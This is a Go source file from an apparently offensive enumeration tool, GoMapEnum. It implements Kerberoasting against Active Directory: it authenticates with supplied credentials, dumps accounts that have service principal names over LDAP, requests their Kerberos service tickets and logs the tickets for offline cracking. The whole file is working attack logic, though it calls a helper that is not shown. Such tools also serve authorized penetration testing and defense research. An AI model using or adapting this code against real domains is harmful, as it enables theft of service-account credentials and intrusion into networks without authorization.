package kerberos

import (
	"GoMapEnum/src/logger"
	"GoMapEnum/src/modules/ldap"
	"reflect"
	"strings"
)

// Kerberoasting retrieve the service ticket for a user. If the user is not provided, it will retrieve the service ticket for all users with a SPN
// The SPN argument could be empty and a LDAP request will be made to know the SPN for the user.
func (options *Options) Kerberoasting(username, spn string) string {

	optionsInterface := reflect.ValueOf(options).Interface()
	// check options.kerberosConfig to initialize only once
	if options.kerberosConfig == nil && !InitSession(&optionsInterface) {
		options.Log.Fatal("Cannot initialize Kerberos session")
	}
	valid, client, err := options.authenticate(options.Users, options.Passwords)
	if err != nil {
		ok, errorString := handleKerbError(err)
		if ok {
			options.Log.Error("%s - %s", username, errorString)
		} else {
			options.Log.Fatal("%s - %s", username, errorString)
		}
		return ""
	}
	if !valid {
		options.Log.Error("%s - %s", username, "Invalid credentials")
		return ""
	}
	// Prepare the ldap options to retrieve the users with a SPN
	var optionsLDAP ldap.Options
	tmpLog := new(logger.Logger)
	*tmpLog = *options.Log
	optionsLDAP.Log = tmpLog
	optionsLDAP.Log.Level = logger.ErrorLevel
	optionsLDAP.Log.Module = "LDAP\t"
	optionsLDAP.TLS = "NoTLS"
	optionsLDAP.Users = options.Users
	optionsLDAP.Passwords = options.Passwords
	optionsLDAP.Target = options.Target
	optionsLDAP.ProxyHTTP = options.ProxyHTTP
	optionsLDAP.UseNTLM = true

	if !optionsLDAP.InitLDAP() {
		options.Log.Error("Cannot initialize LDAP")
		return ""
	}
	// If no username is provided, we retrieve the service ticket for all SPN. Otherwise, we retrieve the service ticket for the provided username
	if username != "" {
		// If the SPN is not provided in argument, we retrieve it through the ldap module
		if spn == "" {
			// From the LDAP service retrieve all SPN and the find the one corresponding to the username
			kerberoastableAccounts := ldap.ParseLDAPData(optionsLDAP.DumpObject("kerberoastableaccounts"), []string{"sAMAccountName", "servicePrincipalName"})
			for _, account := range kerberoastableAccounts {
				// If the samaccountname is the same as the username it's our SPN
				if strings.EqualFold(account[0], username) {
					spn = account[1]
				}
			}
			// If we didn't find the SPN, it means the username do not have a SPN on it
			if spn == "" {
				options.Log.Error("cannot find an SPN for %s", username)
				return ""
			}
		}
		options.Log.Debug("Getting the service ticket of %s with spn %s", username, spn)
		ST := kerberoasting(client, username, spn)
		options.Log.Success(ST)
		return ST
	}
	kerberoastableAccounts := ldap.ParseLDAPData(optionsLDAP.DumpObject("kerberoastableaccounts"), []string{"sAMAccountName", "servicePrincipalName"})
	var res []string
	// For each account with a SPN get the service ticket
	for _, account := range kerberoastableAccounts {
		res = append(res, options.Kerberoasting(account[0], account[1]))
	}

	return strings.Join(res, "\n")
}
